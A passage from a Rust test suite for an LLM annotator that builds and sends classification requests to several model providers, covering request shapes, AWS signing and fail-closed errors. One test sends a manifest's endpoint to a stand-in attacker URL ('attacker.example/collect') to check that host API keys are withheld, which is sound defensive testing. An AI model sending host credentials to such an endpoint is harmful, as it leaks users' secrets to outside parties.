            try_dispatch_url_sourced(annotator(&[(FIELD_ENDPOINT, attacker)]), body);
        result.expect("dispatch still completes, just without a host credential");
        let url_request = transport.last_request().expect("request captured");
        assert_eq!(url_request.url, "https://attacker.example/collect");
        assert!(
            !url_request.headers.contains_key(HEADER_AUTHORIZATION),
            "URL sourced manifest must not attach a host credential"
        );

        std::env::remove_var("OPENAI_API_KEY");
    }

    #[test]
    fn url_sourced_llm_still_uses_inline_credentials() {
        // The restriction is host-environment only; an inline credential the
        // remote manifest supplies itself is still honored.
        let (result, transport) = try_dispatch_url_sourced(
            annotator(&[(FIELD_API_KEY, json!("sk-inline-from-manifest"))]),
            r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#,
        );
        result.expect("inline credential dispatch succeeds");
        let request = transport.last_request().expect("request captured");
        assert_eq!(
            request.headers[HEADER_AUTHORIZATION],
            "Bearer sk-inline-from-manifest"
        );
    }

    #[test]
    fn url_sourced_bedrock_without_inline_credentials_fails_closed() {
        // Bedrock would otherwise read default AWS_* credentials and send the
        // session token verbatim; a URL sourced manifest fails closed instead.
        let (result, _transport) = try_dispatch_url_sourced(
            annotator(&[
                (FIELD_PROVIDER, json!("bedrock")),
                (FIELD_MODEL, json!("anthropic.claude-3")),
                (FIELD_AWS_REGION, json!("us-east-1")),
            ]),
            r#"{"output":{"message":{"content":[{"text":"{\"label\":\"safe\"}"}]}}}"#,
        );
        let error = result.expect_err("must fail closed without inline AWS credentials");
        assert!(error.detail().contains("inline"));
    }

    #[test]
    fn openai_compatible_allows_local_gateway_without_key() {
        let (_output, request) = dispatch(
            annotator(&[
                (FIELD_PROVIDER, json!("openai_compatible")),
                (
                    FIELD_ENDPOINT,
                    json!("http://127.0.0.1:8000/v1/chat/completions"),
                ),
            ]),
            r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#,
        );

        assert!(!request.headers.contains_key(HEADER_AUTHORIZATION));
        assert_eq!(
            request.body[REQUEST_MESSAGES][1][REQUEST_CONTENT],
            json!("review this")
        );
    }

    #[test]
    fn azure_openai_builds_deployment_url_and_api_key_header() {
        std::env::set_var("ACS_AZURE_OPENAI_TEST_KEY", "azure-key");
        let (_output, request) = dispatch(
            annotator(&[
                (FIELD_PROVIDER, json!("azure_openai")),
                (FIELD_ENDPOINT, json!("https://example.openai.azure.com")),
                (FIELD_DEPLOYMENT, json!("judge-deploy")),
                (FIELD_API_VERSION, json!("2024-02-15-preview")),
                (FIELD_API_KEY_ENV, json!("ACS_AZURE_OPENAI_TEST_KEY")),
            ]),
            r#"{"choices":[{"message":{"content":"{\"label\":\"risky\"}"}}]}"#,
        );

        assert_eq!(request.url, "https://example.openai.azure.com/openai/deployments/judge-deploy/chat/completions?api-version=2024-02-15-preview");
        assert_eq!(request.headers[HEADER_API_KEY], "azure-key");
        assert!(request.body.get(REQUEST_MODEL).is_none());
    }

    #[test]
    fn gemini_uses_generate_content_shape_and_parts_response() {
        std::env::set_var("ACS_GEMINI_TEST_KEY", "gemini-key");
        let (output, request) = dispatch(
            annotator(&[
                (FIELD_PROVIDER, json!("gemini")),
                (FIELD_MODEL, json!("gemini-1.5-flash")),
                (FIELD_API_KEY_ENV, json!("ACS_GEMINI_TEST_KEY")),
            ]),
            r#"{"candidates":[{"content":{"parts":[{"text":"{\"label\":\"safe\"}"}]}}]}"#,
        );

        assert_eq!(output["label"], json!("safe"));
        assert_eq!(
            request.url,
            "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent"
        );
        assert!(!request.url.contains("gemini-key"));
        assert_eq!(request.headers["x-goog-api-key"], "gemini-key");
        assert_eq!(
            request.body["generationConfig"]["responseMimeType"],
            json!("application/json")
        );
    }

    #[test]
    fn ollama_uses_local_chat_shape_and_message_response() {
        let (output, request) = dispatch(
            annotator(&[(FIELD_PROVIDER, json!("ollama"))]),
            r#"{"message":{"content":"{\"label\":\"safe\"}"},"done":true}"#,
        );

        assert_eq!(output["label"], json!("safe"));
        assert_eq!(request.url, DEFAULT_OLLAMA_CHAT_URL);
        assert_eq!(request.body["format"], json!("json"));
        assert_eq!(request.body["stream"], json!(false));
    }

    #[test]
    fn bedrock_signs_converse_shape_and_parses_output_message() {
        let (output, request) = dispatch(
            annotator(&[
                (FIELD_PROVIDER, json!("bedrock")),
                (FIELD_MODEL, json!("anthropic.claude-3-haiku-20240307-v1:0")),
                (FIELD_AWS_REGION, json!("us-east-1")),
                (FIELD_AWS_ACCESS_KEY_ID, json!("AKIDEXAMPLE")),
                (FIELD_AWS_SECRET_ACCESS_KEY, json!("secret")),
                (FIELD_AWS_AMZ_DATE, json!("20240101T000000Z")),
                (FIELD_AWS_DATE, json!("20240101")),
                (
                    FIELD_HEADERS,
                    json!({"X-Custom-Alpha": "  spaced   value  "}),
                ),
            ]),
            r#"{"output":{"message":{"content":[{"text":"{\"label\":\"safe\"}"}]}}}"#,
        );

        assert_eq!(output["label"], json!("safe"));
        assert!(request.url.contains("bedrock-runtime.us-east-1.amazonaws.com/model/anthropic.claude-3-haiku-20240307-v1%3A0/converse"));
        assert!(request.headers[HEADER_AUTHORIZATION].starts_with(
            "AWS4-HMAC-SHA256 Credential=AKIDEXAMPLE/20240101/us-east-1/bedrock/aws4_request"
        ));
        assert!(request.headers[HEADER_AUTHORIZATION].contains(
            "SignedHeaders=accept;content-type;host;x-amz-content-sha256;x-amz-date;x-custom-alpha"
        ));
        assert_eq!(request.headers["x-amz-date"], "20240101T000000Z");
    }

    #[test]
    fn sigv4_canonical_headers_are_lowercase_sorted_and_combined() {
        let headers = BTreeMap::from([
            ("X-Example".to_string(), "  one   two  ".to_string()),
            ("accept".to_string(), "application/json".to_string()),
            ("x-example".to_string(), "three".to_string()),
            ("Host".to_string(), "example.amazonaws.com".to_string()),
        ]);

        let (canonical, signed) = canonical_sigv4_headers(&headers);

        assert_eq!(
            canonical,
            "accept:application/json\nhost:example.amazonaws.com\nx-example:one two,three\n"
        );
        assert_eq!(signed, "accept;host;x-example");
    }

    #[test]
    fn malformed_model_json_fails_closed() {
        let transport = StubHttpTransport::with_response(
            200,
            r#"{"choices":[{"message":{"content":"not-json"}}]}"#,
        );
        let error = LlmAnnotator::new()
            .dispatch_with_transport(
                "judge",
                &annotator(&[(FIELD_PROVIDER, json!("openai_compatible"))]),
                &pi(),
                &transport,
            )
            .expect_err("malformed content fails");

        assert!(matches!(error, RuntimeError::AnnotationFailed(_)));
    }

    #[test]
    fn provider_http_error_fails_closed() {
        let transport = StubHttpTransport::with_response(500, r#"{"error":"boom"}"#);
        let error = LlmAnnotator::new()
            .dispatch_with_transport(
                "judge",
                &annotator(&[(FIELD_PROVIDER, json!("openai_compatible"))]),
                &pi(),
                &transport,
            )
            .expect_err("HTTP error fails");

        assert!(matches!(error, RuntimeError::AnnotationFailed(_)));
    }

    #[test]
    fn system_prompt_file_is_read_into_the_system_message() {
        let path = std::env::temp_dir().join(format!(
            "acs-system-prompt-{}-{:?}.txt",
            std::process::id(),
            std::thread::current().id()
        ));
        std::fs::write(&path, "classify strictly and audit").unwrap();
        let (_output, request) = dispatch(
            annotator(&[
                (FIELD_PROVIDER, json!("openai_compatible")),
                (
                    FIELD_ENDPOINT,
                    json!("http://127.0.0.1:8000/v1/chat/completions"),
                ),
                (FIELD_SYSTEM_PROMPT_FILE, json!(path.to_string_lossy())),
            ]),
            r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#,
        );
        let _ = std::fs::remove_file(&path);
        assert_eq!(
            request.body[REQUEST_MESSAGES][0][REQUEST_CONTENT],
            json!("classify strictly and audit")
        );
    }

    #[test]
    fn missing_system_prompt_file_fails_closed() {
        let transport = StubHttpTransport::with_response(200, r#"{"choices":[]}"#);
        let error = LlmAnnotator::new()
            .dispatch_with_transport(
                "judge",
                &annotator(&[
                    (FIELD_PROVIDER, json!("openai_compatible")),
                    (
                        FIELD_SYSTEM_PROMPT_FILE,
                        json!("/nonexistent/acs/prompt.txt"),
                    ),
                ]),
                &pi(),
                &transport,
            )
            .expect_err("missing file fails closed");
        assert!(matches!(error, RuntimeError::AnnotationFailed(_)));
    }
}
